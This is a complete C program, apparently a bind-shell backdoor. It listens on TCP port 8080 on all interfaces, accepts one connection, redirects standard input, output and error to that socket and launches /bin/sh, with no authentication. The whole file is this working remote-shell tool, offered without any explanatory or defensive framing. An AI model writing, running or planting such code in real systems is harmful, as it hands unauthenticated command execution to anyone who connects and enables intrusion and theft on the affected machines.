#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>

#define PORT 8080

int startShell(int sockfd) {
	int stdin_bak = dup(0);
	int stdout_bak = dup(1);
	int stderr_bak = dup(2);

	dup2(sockfd,0);
	dup2(sockfd,1);
	dup2(sockfd,2);
	
	system("/bin/sh");
	
	dup2(stdin_bak,0);
	dup2(stdout_bak,1);
	dup2(stderr_bak,2);

	return 0;
}

// Driver function
int main() {
	int sockfd, connfd;
  socklen_t len;
	struct sockaddr_in server_addr, client_addr;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("error in socket()\n");
		exit(0);
	}
	bzero(&server_addr, sizeof(server_addr));

	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	server_addr.sin_port = htons(PORT);

	if ((bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr))) != 0) {
		printf("error in bind()\n");
		exit(0);
	}

	if ((listen(sockfd, 5)) != 0) {
		printf("error in listen()\n");
		exit(0);
	}
	printf("listening...\n");

	len = sizeof(client_addr);

	connfd = accept(sockfd, (struct sockaddr*)&client_addr, &len);
	if (connfd < 0) {
		printf("error in accept()\n");
		exit(0);
	}
	printf("client connected successfully\n");

	startShell(connfd);

	close(sockfd);
}
